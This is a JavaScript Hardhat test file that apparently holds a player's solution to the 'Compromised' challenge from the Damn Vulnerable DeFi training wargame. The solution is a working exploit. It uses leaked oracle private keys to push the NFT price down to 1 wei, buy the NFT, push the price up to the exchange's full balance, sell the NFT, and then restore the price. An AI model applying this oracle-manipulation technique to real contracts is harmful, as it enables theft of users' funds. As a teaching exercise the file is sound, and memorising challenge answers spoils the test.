const { expect } = require('chai');
const { ethers } = require('hardhat');
const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');

describe('Compromised challenge', function () {
    let deployer, player;
    let oracle, exchange, nftToken;

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    const EXCHANGE_INITIAL_ETH_BALANCE = 999n * 10n ** 18n; // 999ETH
    const INITIAL_NFT_PRICE = 999n * 10n ** 18n; // 999ETH
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n; // 0.1ETH
    const TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2n * 10n ** 18n; // 2ETH

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();
        
        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            setBalance(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
            expect(await ethers.provider.getBalance(sources[i])).to.equal(TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        
        // Player starts with limited balance
        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
        
        // Deploy the oracle and setup the trusted sources with initial prices
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);
        oracle = await (await ethers.getContractFactory('TrustfulOracle', deployer)).attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ['DVNFT', 'DVNFT', 'DVNFT'],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = await (await ethers.getContractFactory('Exchange', deployer)).deploy(
            oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        nftToken = await (await ethers.getContractFactory('DamnValuableNFT', deployer)).attach(await exchange.token());
        expect(await nftToken.owner()).to.eq(ethers.constants.AddressZero); // ownership renounced
        expect(await nftToken.rolesOf(exchange.address)).to.eq(await nftToken.MINTER_ROLE());
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const symbol = await nftToken.symbol()
        const ORACLE_1 = new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider)
        const ORACLE_2 = new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider)

        // Set price to 1
        console.log("price before", (await oracle.getMedianPrice(symbol)).toString())
        await oracle.connect(ORACLE_1).postPrice(symbol, 1)
        await oracle.connect(ORACLE_2).postPrice(symbol, 1)
        console.log("price after", (await oracle.getMedianPrice(symbol)).toString())
        
        // Buy NFT with 1 wei
        const tx = await exchange.connect(player).buyOne({value: 1})
        const rc = await tx.wait()
        const id = rc.events.find(e => e.event == "TokenBought").args.tokenId

        // Set price to 999 ETH + 1 wei
        console.log("price before", (await oracle.getMedianPrice(symbol)).toString())
        await oracle.connect(ORACLE_1).postPrice(symbol, EXCHANGE_INITIAL_ETH_BALANCE + 1n)
        await oracle.connect(ORACLE_2).postPrice(symbol, EXCHANGE_INITIAL_ETH_BALANCE + 1n)
        console.log("price after", (await oracle.getMedianPrice(symbol)).toString())

        // Sell NFT
        await nftToken.connect(player).approve(exchange.address, id)
        await exchange.connect(player).sellOne(id)

        // Set price to 999 ETH
        await oracle.connect(ORACLE_1).postPrice(symbol, EXCHANGE_INITIAL_ETH_BALANCE)
        await oracle.connect(ORACLE_2).postPrice(symbol, EXCHANGE_INITIAL_ETH_BALANCE)
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(exchange.address)
        ).to.be.eq(0);
        
        // Player's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(player.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Player must not own any NFT
        expect(
            await nftToken.balanceOf(player.address)
        ).to.be.eq(0);

        // NFT price shouldn't have changed
        expect(
            await oracle.getMedianPrice('DVNFT')
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
